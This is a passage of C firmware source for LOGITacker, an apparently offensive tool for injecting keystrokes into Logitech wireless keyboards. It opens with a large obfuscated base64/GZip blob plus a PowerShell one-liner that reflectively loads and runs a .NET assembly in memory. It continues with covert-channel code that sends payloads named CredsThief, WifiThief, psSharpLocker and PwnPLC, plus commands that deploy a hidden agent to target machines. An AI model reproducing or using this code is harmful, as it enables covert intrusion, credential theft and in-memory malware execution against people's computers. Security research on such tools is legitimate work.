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\";[string[]]$ARGS_NAME = @("User");nal no New-Object -F;$m=no IO.MemoryStream;(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress)).CopyTo($m);$asm=[System.Reflection.Assembly]::Load($m.ToArray());$asm.EntryPoint.Invoke($null, [object[]](,$ARGS_NAME));exit";


bool pre_cmd_callback_covert_channel(nrf_cli_t const * p_cli, char const * const p_cmd_buf) {
    if (strcmp(p_cmd_buf, "!exit") == 0) {
        nrf_cli_register_pre_cmd_callback(p_cli, NULL);
        logitacker_enter_mode_discovery();
        return true;
    }
    
    if (strcmp(p_cmd_buf, "!sharplock") == 0) {
        return pre_cmd_callback_covert_channel(p_cli, psSharpLocker);
    }

    if (strcmp(p_cmd_buf, "!pwnplc") == 0) {
        return pre_cmd_callback_covert_channel(p_cli, PwnPLC);
    }
    
    if (strcmp(p_cmd_buf, "!pwnplc120s") == 0) {
        return pre_cmd_callback_covert_channel(p_cli, PwnPLC120s);
    }
    
    if (strcmp(p_cmd_buf, "!credsthief") == 0) {
        return pre_cmd_callback_covert_channel(p_cli, CredsThief);
    }
    
    if (strcmp(p_cmd_buf, "!wifithief") == 0) {
        return pre_cmd_callback_covert_channel(p_cli, WifiThief);
    }
    
    if (strcmp(p_cmd_buf, "!seatbeltrecon") == 0) {
        return pre_cmd_callback_covert_channel(p_cli, SeatbeltRecon);
    }

    covert_channel_payload_data_t tmp_tx_data = {0};

    //push chunks of cmd_buff
    int pos = 0;
    while (strlen(&p_cmd_buf[pos]) >= MAX_CC_PAY_SIZE) {
        memcpy(tmp_tx_data.data, &p_cmd_buf[pos], MAX_CC_PAY_SIZE);
        tmp_tx_data.len = MAX_CC_PAY_SIZE;

        NRF_LOG_HEXDUMP_DEBUG(tmp_tx_data.data, MAX_CC_PAY_SIZE);
        uint32_t err = logitacker_covert_channel_push_data(&tmp_tx_data);
        if (err != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "error writing covert channel data 0x%08x\r\n", err);
            return true;
        }

        pos += MAX_CC_PAY_SIZE;
    }


    size_t slen = strlen(&p_cmd_buf[pos]);

    memset(tmp_tx_data.data, 0, 16);
    memcpy(tmp_tx_data.data, &p_cmd_buf[pos], slen);
    tmp_tx_data.len = slen + 1;

    //append line break
    tmp_tx_data.data[slen] = '\n';

    NRF_LOG_HEXDUMP_DEBUG(tmp_tx_data.data,tmp_tx_data.len);

    uint32_t err = logitacker_covert_channel_push_data(&tmp_tx_data);
    if (err != NRF_SUCCESS) {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "error writing covert channel data 0x%08x\r\n", err);
    }

    return true;
}


static void cmd_covert_channel_connect(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting covert channel for device %s\r\n", tmp_addr_str);
        logitacker_enter_mode_covert_channel(addr, p_cli);

        nrf_cli_register_pre_cmd_callback(p_cli, &pre_cmd_callback_covert_channel);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "enter '!exit' to return to normal CLI mode\r\n\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "This feature is a PoC in experimental state\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "I don't accept issues or requests on it, unless they fly in \r\nas working PR for LOGITacker\r\n");

        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}

static void cmd_covert_channel_deploy(nrf_cli_t const *p_cli, size_t argc, char **argv) {

    if (argc > 1)
    {
        //nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);

        //parse arg 1 as address
        uint8_t addr[5];
        if (strcmp(argv[1], "USB") == 0) {
            memset(addr,0x00,5);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes to USB keyboard interface\r\n");
        } else {
            if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
                return;
            }

            char tmp_addr_str[16];
            helper_addr_to_hex_str(tmp_addr_str, 5, addr);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
        }

        bool hide = true;
        if (argc > 2 && strcmp(argv[2],"unhide") == 0) hide = false;

        // deploy covert channel agent
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "load covert channel client agent script\r\n");
        deploy_covert_channel_script(hide);
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "inject covert channel client agent into target %s\r\n", argv[1]);

        //logitacker_keyboard_map_test();
        logitacker_enter_mode_injection(addr);
        logitacker_injection_start_execution(true);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "device address needed, format has to be xx:xx:xx:xx:xx\r\n");
        return;
    }
}


#ifdef CLI_TEST_COMMANDS
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_test)
        {
                NRF_CLI_CMD(a, NULL, "test a", cmd_test_a),
                NRF_CLI_CMD(b, NULL, "test b", cmd_test_b),
                NRF_CLI_CMD(c, NULL, "test b", cmd_test_c),
                NRF_CLI_SUBCMD_SET_END
        };
NRF_CLI_CMD_REGISTER(test, &m_sub_test, "Debug command to test code", NULL);

NRF_CLI_CMD_REGISTER(testled, NULL, "Debug command to test code", cmd_testled);
#endif



NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_discover)
{
    NRF_CLI_CMD(run,   NULL, "Enter discover mode.", cmd_discover_run),
    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(discover, &m_sub_discover, "discover", cmd_discover);

//pair_sniff_run level 3
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_pair_device_addresses, dynamic_device_addr_list_ram);

//pair_sniff level 2
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_pair_sniff)
{
        NRF_CLI_CMD(run, NULL, "Sniff pairing.", cmd_pair_sniff_run),
        NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_pair_device)
{
        NRF_CLI_CMD(run, &m_sub_pair_device_addresses, "Pair device on given address (if no address given, pairing address is used).", cmd_pair_device_run),
        NRF_CLI_SUBCMD_SET_END
};


NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_pair)
{
    NRF_CLI_CMD(sniff, &m_sub_pair_sniff, "Sniff pairing.", cmd_help),
    NRF_CLI_CMD(device, &m_sub_pair_device, "pair or forced pair a device to a dongle", NULL),
    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(pair, &m_sub_pair, "discover", cmd_pair);

//LEVEL 3
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_dynamic_script_name, dynamic_script_name);

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_script)
{
        NRF_CLI_CMD(clear,   NULL, "clear current script (injection tasks)", cmd_script_clear),
        NRF_CLI_CMD(undo,   NULL, "delete last command from script (last injection task)", cmd_script_undo),
        NRF_CLI_CMD(show,   NULL, "show listing of current script", cmd_script_show),
        NRF_CLI_CMD(string,   NULL, "append 'string' command to script, which types out the text given as parameter", cmd_script_string),
        NRF_CLI_CMD(altstring,   NULL, "append 'altstring' command to script, which types out the text using NUMPAD", cmd_script_altstring),
        NRF_CLI_CMD(press,   NULL, "append 'press' command to script, which creates a key combination from the given parameters", cmd_script_press),
        NRF_CLI_CMD(delay,   NULL, "append 'delay' command to script, delays script execution by the amount of milliseconds given as parameter", cmd_script_delay),
        NRF_CLI_CMD(store,   NULL, "store script to flash", cmd_script_store),
        NRF_CLI_CMD(load,   &m_sub_dynamic_script_name, "load script from flash", cmd_script_load),
        NRF_CLI_CMD(list,   NULL, "list scripts stored on flash", cmd_script_list),
        NRF_CLI_CMD(remove,   &m_sub_dynamic_script_name, "delete script from flash", cmd_script_remove),
        NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(script, &m_sub_script, "scripting for injection", cmd_inject);

//level 2
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_inject_target_addr, dynamic_device_addr_list_ram_with_usb);

// level 1
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_inject)
{
    NRF_CLI_CMD(target, &m_sub_inject_target_addr, "enter injection mode for given target RF address", cmd_inject_target),
    NRF_CLI_CMD(execute,   NULL, "run current script against injection target", cmd_inject_execute),
    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(inject, &m_sub_inject, "injection", cmd_inject);

//device level 3
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_storage_load_list, dynamic_device_addr_list_stored);
//NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_store_delete_list, dynamic_device_addr_list_stored_with_all);
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_store_delete_list, dynamic_device_addr_list_stored); // don't offer delete all option for flash
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_store_save_list, dynamic_device_addr_list_ram);
//device level 2
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_devices_storage)
{
    NRF_CLI_CMD(list, NULL, "list devices stored on flash", cmd_devices_storage_list),
    NRF_CLI_CMD(load, &m_sub_device_storage_load_list, "load a stored device", cmd_devices_storage_load),
    NRF_CLI_CMD(save, &m_sub_device_store_save_list, "store a device to flash", cmd_devices_storage_save),
    NRF_CLI_CMD(remove, &m_sub_device_store_delete_list, "delete a stored device from flash", cmd_devices_storage_remove),
    NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_devices_remove_addr_collection, dynamic_device_addr_list_ram_with_all);
//devices level 1 (handles auto-complete from level 2 as parameter)
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_devices)
{
        NRF_CLI_CMD(storage, &m_sub_devices_storage, "handle devices on flash", NULL),
        NRF_CLI_CMD(remove, &m_sub_devices_remove_addr_collection, "delete a device from list (RAM)", cmd_devices_remove),
        NRF_CLI_CMD(add, NULL, "manually add a device (RAM)", cmd_devices_add),
        NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(devices, &m_sub_devices, "List discovered devices", cmd_devices);

NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_enum_device_list, dynamic_device_addr_list_ram);

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_covertchannel)
{
        NRF_CLI_CMD(connnect, &m_sub_enum_device_list, "connect to device with deployed covert channel", cmd_covert_channel_connect),
        NRF_CLI_CMD(deploy, &m_sub_enum_device_list, "deploy covert channel agent for given device", cmd_covert_channel_deploy),
        NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CMD_REGISTER(covert_channel, &m_sub_covertchannel, "start covert channel for given device", NULL);


NRF_CLI_CMD_REGISTER(active_enum, &m_sub_enum_device_list, "start active enumeration of given device", cmd_enum_active);
NRF_CLI_CMD_REGISTER(passive_enum, &m_sub_enum_device_list, "start passive enumeration of given device", cmd_enum_passive);

#ifdef CLI_TEST_COMMANDS
NRF_CLI_CMD_REGISTER(prx, &m_sub_enum_device_list, "start a PRX for the given device address", cmd_prx);
#endif

NRF_CLI_CMD_REGISTER(erase_flash, NULL, "erase all data stored on flash", cmd_erase_flash);

NRF_CLI_CMD_REGISTER(version, NULL, "print version string", cmd_version);

//options

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_on_off)
{
